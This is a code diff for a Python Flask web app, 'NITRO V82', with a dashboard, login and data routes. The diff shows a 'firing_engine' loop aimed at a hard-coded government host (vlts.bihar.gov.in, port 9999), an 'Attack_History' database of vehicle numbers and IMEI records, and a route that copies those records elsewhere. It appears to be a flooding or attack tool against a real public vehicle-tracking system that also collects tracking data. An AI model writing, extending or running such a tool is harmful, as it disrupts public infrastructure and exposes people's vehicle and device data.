@@ -15,7 +15,6 @@ user_sessions = {}
 def get_ist_time():
     return datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
 
-# --- UI HTML ---
 LOGIN_HTML = """
 <!DOCTYPE html>
 <html>
@@ -48,11 +47,9 @@ DASH_HTML = """
 <head>
     <title>NITRO V82 - DASHBOARD</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
         body { background: #000; color: #0f0; font-family: monospace; padding: 10px; display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; }
         .box { border: 2px solid #0f0; padding: 20px; border-radius: 15px; width: 100%; max-width: 480px; background: #050505; box-shadow: 0 0 20px #0f0; }
-        #map { height: 300px; width: 100%; max-width: 480px; border: 2px solid #0f0; border-radius: 15px; }
         .metric { font-size: 50px; color: #fff; margin: 10px 0; font-weight: bold; }
         .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; text-align: left; }
         input { width: 94%; padding: 10px; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; font-weight: bold; }
@@ -95,7 +92,6 @@ DASH_HTML = """
 </html>
 """
 
-# --- LOGIC ---
 def firing_engine(uid):
     target = ("vlts.bihar.gov.in", 9999)
     while uid in user_sessions and user_sessions[uid]["firing"]:
@@ -157,7 +153,6 @@ def data():
     uid = session.get('user')
     return jsonify(user_sessions.get(uid, {"count": 0, "firing": False}))
 
-# --- RECOVERY ROUTE ---
 @app.route('/restore_my_data')
 def restore_data():
     history = requests.get(f"{FB_URL}/Attack_History.json?auth={FB_SECRET}").json()
@@ -170,7 +165,7 @@ def restore_data():
                     if item.get('Vehicle_No') and item.get('IMEI_No'):
                         requests.put(f"{FB_URL}/Data_Records/{item['Vehicle_No']}.json?auth={FB_SECRET}", json=item)
                         count += 1
-    return f"Bhai, {count} vehicles ka data wapas aa gaya hai!"
+    return f"Success! {count} vehicles restored."
 
 @app.route('/logout', methods=['POST'])
 def logout(): session.clear(); return redirect(url_for('login'))
